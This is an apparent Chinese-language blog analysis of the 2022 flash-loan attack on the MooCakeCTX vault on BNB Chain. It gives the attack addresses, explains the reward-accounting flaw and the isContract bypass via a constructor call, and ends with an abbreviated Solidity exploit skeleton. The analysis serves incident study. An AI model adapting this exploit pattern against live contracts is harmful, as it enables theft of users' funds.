---
layout: post
title:  "MooCakeCTX attack"
date:   2022-11-07 11:45:00 +0800
tags: blockchain flashloan hacker 
color: rgb(53,209,242)
cover: '../assets/papercover/hackbg.png'
subtitle: 'MooCakeCTX attack analyze by yako33!'
---

[TOC]

thanks by KRlyx & Deft (beosin security team)

MooCakeCTX合约遭到闪电贷攻击，首位攻击者获得约14万美元，第二位攻击者获利约47万美元，2次攻击手法一致，MooCakeTWT于MooCakeCTX数小时后被攻击。

#### 事件地址信息

攻击交易  
https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a9a0d2ec8e

攻击者地址  
0x35700c4a7bd65048f01d6675f09d15771c0facd5

攻击合约  
0x71Ac864f9388eBD8e55a3cdBC501D79C3810467C

被攻击合约地址  
0x489afbAED0Ea796712c9A6d366C16CA3876D8184

#### 漏洞分析
本次攻击主要利用了抵押奖励合约中，抵押和奖励没有时间等相关的限制，并且对于调用者的防范不够全面，导致攻击者可以利用闪电贷放大分红收益，获取MooCakeCTX

#### 攻击流程
1.在攻击交易0x03d363462我们可以看到2022-11-06 09:30:38 PM +UTC时攻击者利用闪电贷发起攻击,攻击者先使用闪电贷借出BUSD并把自己的钱与借入的钱一起换成vBUSD后再兑换成CAKE币用做抵押的准备资金，因为在StrategySyrup中只能使用cake币作为抵押，所以这里全部换成了cake币。而同时准备CTK币，为了smartchef能够抵押调用成功进行的转账。

<ul>
<li  markdown="1" style="list-style-type: none;">
![1]({{site.url}}/screenshot/20221107MooCakeCTX/1.png)
<p></p>
![2]({{site.url}}/screenshot/20221107MooCakeCTX/2.png)
</li>
</ul>


2.而在具体的攻击流程函数调用中我们可以看到当，当攻击者调用deposit函数后立马使用call调用了harvest函数，而这里的调用地址是一个攻击合约并且在最后看到此合约已经自毁。我们可以看到在图中harvest函数代码中，对调用地址是否是EOA地址做了判断，但当发起调用在构造函数的情况下iscontract()可以被绕过从而实现了合约调用，这是此次攻击的核心之一。


<ul>
<li  markdown="1" style="list-style-type: none;">
![3]({{site.url}}/screenshot/20221107MooCakeCTX/3.png)
<p></p>
![4]({{site.url}}/screenshot/20221107MooCakeCTX/4.png)
</li>
</ul>


3.接着就是此次攻击的问题所在，BeefyVault合约中由于奖励计算根据所占的抵押份额计算，其中更新奖励又是按照账户调用harvest函数进行更新，那么在一次更新领取奖励的轮次中，只要所占份额越大，获利越多，所以攻击者用闪电贷放大了收益(而上一次在733天前)，并且绕过了iscontract使用合约调用，值得注意的是这里的depositAll和withdrawAll中与时间没有关系，所以攻击者可以在depoist后立马调用withdrawAll领取奖励。

<ul>
<li  markdown="1" style="list-style-type: none;">
![5]({{site.url}}/screenshot/20221107MooCakeCTX/5.png)
<p></p>
![6]({{site.url}}/screenshot/20221107MooCakeCTX/6.png)
</li>
</ul>

4.攻击者又执行了两次相同手法的攻击，并归还了闪电贷,获利424 BNB(约14万)离场。并且攻击者因为操作步骤出错WBNB没有转出。

<ul>
<li  markdown="1" style="list-style-type: none;">
![7]({{site.url}}/screenshot/20221107MooCakeCTX/7.png)
</li>
</ul>

### MooCakeCTX exp解析
[exp提供者](https://github.com/SunWeb3Sec/DeFiHackLabs)

moocakeCTX exp只包含大体结构,代码省略了部分不关键的地方：
```js
//接口实现+其他接口
interface StrategySyrup {...}

contract Harvest {
    //构造函数中执行来绕过
    constructor(){
        StrategySyrup strategySyrup = StrategySyrup(...);
        strategySyrup.harvest();
    }
}

contract exp {
    function Exploit() public {
        //交换一点CTK
        WBNBToCTK();
        CTK.transfer(address(SmartChef), CTK.balanceOf(address(this)));
        //执行dodo的闪电贷
        DVM(dodo).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));
    }

    //回调函数中执行逻辑
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
        address [] memory cTokens = new address[](2);
        cTokens[0] = address(vBUSD);
        cTokens[1] = address(vCAKE);
        //控制器token的格式数组
        unitroller.enterMarkets(cTokens);
        BUSD.approve(address(vBUSD), type(uint).max);
        //mintVBUSD
        vBUSD.mint(BUSD.balanceOf(address(this)));
        //借VCake
        vCAKE.borrow(50_000 * 1e18);
        CAKE.approve(address(beefyVault), type(uint).max);
        //viper合约中质押所有
        beefyVault.depositAll();
        //初始化并且执行，绕过。
        Harvest harvest = new Harvest();
        //取走
        beefyVault.withdrawAll();
        //偿还
        CAKE.approve(address(vCAKE), type(uint).max);
        vCAKE.repayBorrow(50_000 * 1e18);
        vBUSD.redeemUnderlying(400_000 * 1e18);
        //归还闪电贷
        BUSD.transfer(dodo, 400_000 * 1e18);
    }
}

```